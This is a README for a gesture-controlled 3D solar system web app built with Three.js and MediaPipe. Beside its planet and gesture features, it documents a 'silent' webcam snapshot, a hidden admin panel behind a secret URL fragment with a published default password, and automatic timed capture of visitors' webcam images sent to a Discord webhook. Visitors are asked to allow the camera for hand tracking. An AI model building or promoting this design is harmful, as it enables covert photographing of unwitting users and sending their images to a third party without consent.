# Space Explorer — AI Holographic Solar System Interface

A fully interactive, 3D Solar System Explorer controlled by hand gestures, touch, and keyboard — built with Three.js and Google MediaPipe AI hand tracking.

Live Demo: https://usefd1364.github.io/spaceexplorer/

---

## Features at a Glance

| Feature | Description |
|---|---|
| 3D Solar System | Full solar system with all 9 planets orbiting in real-time |
| Hand Gesture Control | 9 unique hand gestures powered by AI (MediaPipe) |
| Touch Support | Full swipe, pinch, and tap controls for mobile |
| Keyboard Shortcuts | Full keyboard control for desktop users |
| Planet Info HUD | Holographic data panel with real facts for every planet |
| Webcam Snapshot | Silently capture webcam photos via gesture or button |
| Discord Webhook | Automatically send captured images to a Discord channel |
| Admin Panel | Password-protected admin console to control all settings |
| Speed Boost Mode | 4x orbital speed mode for a timelapse effect |
| Auto-Tour Mode | Automatically cycles through all planets |
| Toggle Orbit Rings | Show or hide the orbital path rings |
| Rotation Lock | Lock the camera angle to stop the scene rotating |
| Gesture Trail | Cyan particle trail follows your fingertip in real-time |

---

## Quick Start (No Installation Needed!)

This project is a single HTML file with zero dependencies to install.
All libraries load from the internet automatically (CDN).

### Option 1 — Use the Live Website (Easiest)

Open your browser and go to:

  https://usefd1364.github.io/spaceexplorer/

Allow camera access when your browser asks, and you are ready!

### Option 2 — Run Locally

1. Clone this repository:

  git clone https://github.com/usefd1364/spaceexplorer.git

2. Double-click index.html to open it in your browser (Chrome or Edge recommended).

3. Click Allow when the browser asks for camera access.

NOTE: Hand tracking requires a webcam and camera permission.
The 3D scene works without a camera, but gestures will not work.

---

## Planet Information

Click on any planet or use gestures/keyboard to navigate.
The holographic HUD panel on the right shows real scientific data.

| Planet | Type | Highlight |
|---|---|---|
| Sun | Star | System center / overview |
| Mercury | Terrestrial | Closest to the Sun |
| Venus | Terrestrial | Hottest planet |
| Earth | Terrestrial | Our home |
| Mars | Terrestrial | The Red Planet |
| Jupiter | Gas Giant | Largest planet |
| Saturn | Gas Giant | Iconic ring system |
| Uranus | Ice Giant | Rotates on its side |
| Neptune | Ice Giant | Farthest planet |

---

## Hand Gesture Controls — Full Reference

Allow camera access first, then hold your hand in front of the webcam.
The small preview box in the bottom-left corner shows what the camera sees.
The mouse cursor hides automatically when your hand is detected.

| Gesture | How to Make It | What It Does |
|---|---|---|
| Open Palm | All fingers spread open | Rotate the solar system view |
| Pinch | Touch index tip to thumb tip | Zoom in / Zoom out |
| Index Point | Only index finger pointing up | Go to Next planet |
| Peace Sign | Index + Middle finger up | Go to Previous planet |
| Closed Fist | All fingers curled down | Reset view to the Sun |
| 3 Fingers | Index + Middle + Ring up | Toggle 4x Speed Boost |
| OK Sign | Index + Thumb make a circle | Toggle Orbit Rings on/off |
| Shaka | Only Thumb + Pinky up | Take a silent Webcam Snapshot |
| Vulcan Salute | All 4 fingers up, spread gap between middle and ring | Toggle Auto-Tour mode |

Tips for best gesture recognition:
- Use your hand in good lighting (do not sit backlit)
- Hold each gesture for about 1 second (cooldown prevents accidental triggers)
- Keep your hand within the camera frame
- A cyan trail follows your index fingertip to confirm tracking is working

---

## Touch Controls (Mobile)

| Touch Action | Result |
|---|---|
| Single tap on a planet | Select planet and show info |
| Double tap anywhere | Reset view to Sun |
| Drag with one finger | Rotate the solar system |
| Pinch with 2 fingers | Zoom in / out |
| 2-finger twist | Rotate scene |
| Swipe Left | Next planet |
| Swipe Right | Previous planet |
| Swipe Up | Toggle Speed Boost |
| Swipe Down | Toggle Auto-Tour |
| 3-finger tap | Toggle Speed Boost |

---

## Keyboard Shortcuts (Desktop)

| Key | Action |
|---|---|
| Arrow Right or D | Next planet |
| Arrow Left or A | Previous planet |
| Space or Home | Reset to Sun view |
| T | Toggle Auto-Tour mode |
| B | Toggle Speed Boost |
| O | Toggle Orbit Rings on/off |
| S | Take a Snapshot |
| L | Toggle Rotation Lock |
| ? | Open Gesture Guide panel |
| Ctrl + Shift + A | Open Admin Panel |
| Mouse Drag | Rotate scene |
| Scroll Wheel | Zoom in / out |

---

## UI Elements Explained

### Top Bar
Shows the app title "SOLAR EXPLORER" and a live clock on the right side.

### Planet Navigation Dots (Left Side)
Small glowing dots on the left edge of the screen.
Click any dot to jump directly to that planet.
The active planet dot fills with cyan glow.

### HUD Panel (Right Side)
Slides in from the right when you select a planet. Contains:
- Planet name
- Distance from the Sun
- Surface gravity
- Surface temperature
- Planet type
- Short description

Click the X button in the top corner of the panel to close it.

### Status Pills (Top Center)
Glowing badge indicators that appear when a special mode is turned on:
- SPEED BOOST — 4x orbital speed is active
- AUTO-TOUR — Automatically cycling through all planets
- ROTATION LOCKED — Camera rotation is frozen
- ORBITS OFF — Orbit rings are currently hidden

### Gesture Badge (Bottom Left)
A small notification that briefly flashes after a gesture is recognized,
showing the emoji and action name (e.g. "Next Planet").

### Camera Preview (Bottom Left)
A small mirrored webcam view showing what the AI hand tracker sees.
It is mirrored (flipped) so it feels natural, like looking in a mirror.

### Help Button (Bottom Right)
The question mark button opens the Gesture Command Center panel —
a full reference card listing every gesture and keyboard shortcut.

---

## Admin Panel

The Admin Panel is a hidden, password-protected console.
It lets you manage the webcam capture system and Discord integration.

### How to Access

Method 1 — Open this URL in your browser:
  https://usefd1364.github.io/spaceexplorer/#998765

  IMPORTANT: Always use # in the URL. Do NOT use a forward slash /.

Method 2 — Press Ctrl + Shift + A on your keyboard while the app is open.

### Default Password

  UBUNTULINUX593

### Admin Panel Features

| Feature | What It Does |
|---|---|
| Start Capture | Begins taking webcam snapshots automatically |
| Stop Capture | Stops the automatic capture |
| Snap Now | Takes one photo immediately |
| Capture Interval | Set the delay in seconds between each automatic capture |
| Send on Capture | Automatically send each photo to Discord when taken |
| Include Timestamp | Adds the date and time to each sent image |
| Image Quality | Adjust photo quality (0.1 = low file size, 1.0 = maximum quality) |
| Webhook URL | Paste your Discord webhook URL here |
| Stats | Shows total photos captured and total photos sent |
| Gallery | View all captured photos in a grid with lightbox zoom |
| Clear Gallery | Delete all photos from memory |
| Change Password | Update the admin access password |

---

## Discord Webhook Setup

Follow these steps to automatically send webcam snapshots to a Discord channel:

1. Open Discord and go to your server
2. Right-click on any text channel and click Edit Channel
3. Click Integrations in the left menu
4. Click Webhooks then click New Webhook
5. Give it a name (for example: Space Explorer Cam)
6. Click Copy Webhook URL
7. Go to the Admin Panel (use the URL with #998765)
8. Paste the copied URL into the Webhook URL field
9. Turn on the Send on Capture toggle
10. Click Start Capture

Photos will now be sent to your Discord channel automatically!

---

## Tech Stack

| Technology | What It Is Used For |
|---|---|
| HTML5, CSS3, JavaScript | Core structure, design, and all logic |
| Three.js | 3D rendering of the solar system and planets |
| Google MediaPipe Hands | AI that detects hand landmarks from webcam |
| MediaPipe Camera Utils | Manages the webcam video feed |
| Google Fonts (Orbitron, Share Tech Mono) | The futuristic holographic typography |
| GitHub Pages | Free hosting that makes the site live on the internet |

No npm, no Node.js, no build tools required.
Just one HTML file that runs in any modern browser.

---

## File Structure

```
spaceexplorer/
|
|-- index.html      <- The entire application (one single file)
|-- README.md       <- Project documentation (this file)
```

---

## Browser Compatibility

| Browser | Status |
|---|---|
| Google Chrome (Desktop) | Fully supported — Recommended |
| Microsoft Edge | Fully supported |
| Chrome for Android | Supported — touch and camera work |
| Firefox | Mostly works — MediaPipe may be slightly slower |
| Safari on iOS | Partial — camera permission varies by iOS version |

Best experience: Google Chrome on a desktop or laptop with a webcam.

---

## Troubleshooting

**Camera preview is black and gestures do not work**
You likely denied camera access. Refresh the page and click Allow when the browser asks for camera permission.

**Getting a 404 error when opening the Admin Panel**
Make sure you use # in the URL, not a slash.
Correct: https://usefd1364.github.io/spaceexplorer/#998765
Wrong:   https://usefd1364.github.io/spaceexplorer/998765

**Gestures are not being recognized correctly**
- Improve the lighting on your hand
- Keep your hand fully inside the camera frame
- Try using a plain wall or background behind your hand

**The page shows a black screen with no 3D content**
Your browser may not support WebGL 3D graphics.
Switch to Google Chrome or Microsoft Edge and try again.

**Discord is not receiving the captured images**
- Double-check the webhook URL has no extra spaces when you paste it
- Make sure the Send on Capture toggle is switched ON
- Make sure you clicked Start Capture to begin the capture session

---

## License

This project is open source.
Feel free to fork, modify, and build on top of it for personal or educational use.

---

Made with love by usefd1364

Live Demo: https://usefd1364.github.io/spaceexplorer/
GitHub: https://github.com/usefd1364/spaceexplorer
